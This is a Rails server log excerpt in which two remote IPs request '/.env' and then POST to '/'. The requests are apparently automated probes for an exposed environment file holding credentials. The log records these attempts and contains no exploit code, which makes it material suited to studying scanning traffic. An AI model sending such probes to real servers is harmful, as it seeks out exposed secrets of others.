I, [2023-01-25T23:54:08.492113 #1791621]  INFO -- : Started GET "/.env" for 135.125.217.54 at 2023-01-25 23:54:08 +0900
I, [2023-01-25T23:54:08.492706 #1791621]  INFO -- : Processing by UserController#index as */*
I, [2023-01-25T23:54:08.492745 #1791621]  INFO -- :   Parameters: {"all"=>".env"}
I, [2023-01-25T23:54:08.493518 #1791621]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-01-25T23:54:08.494466 #1791621]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 1.0ms | Allocations: 299)
I, [2023-01-25T23:54:08.494648 #1791621]  INFO -- : Completed 200 OK in 2ms (Views: 1.6ms | Allocations: 521)
I, [2023-01-25T23:54:09.049786 #1791623]  INFO -- : Started POST "/" for 135.125.217.54 at 2023-01-25 23:54:09 +0900
F, [2023-01-25T23:54:09.050134 #1791623] FATAL -- :   
ActionController::RoutingError (No route matches [POST] "/"):
  
I, [2023-01-25T23:59:40.902015 #1791623]  INFO -- : Started GET "/.env" for 95.214.235.205 at 2023-01-25 23:59:40 +0900
I, [2023-01-25T23:59:40.902612 #1791623]  INFO -- : Processing by UserController#index as */*
I, [2023-01-25T23:59:40.902652 #1791623]  INFO -- :   Parameters: {"all"=>".env"}
I, [2023-01-25T23:59:40.903187 #1791623]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-01-25T23:59:40.903822 #1791623]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.7ms | Allocations: 299)
I, [2023-01-25T23:59:40.903998 #1791623]  INFO -- : Completed 200 OK in 1ms (Views: 1.0ms | Allocations: 521)
I, [2023-01-25T23:59:42.469766 #1791621]  INFO -- : Started POST "/" for 95.214.235.205 at 2023-01-25 23:59:42 +0900
F, [2023-01-25T23:59:42.470105 #1791621] FATAL -- :   
ActionController::RoutingError (No route matches [POST] "/"):
  
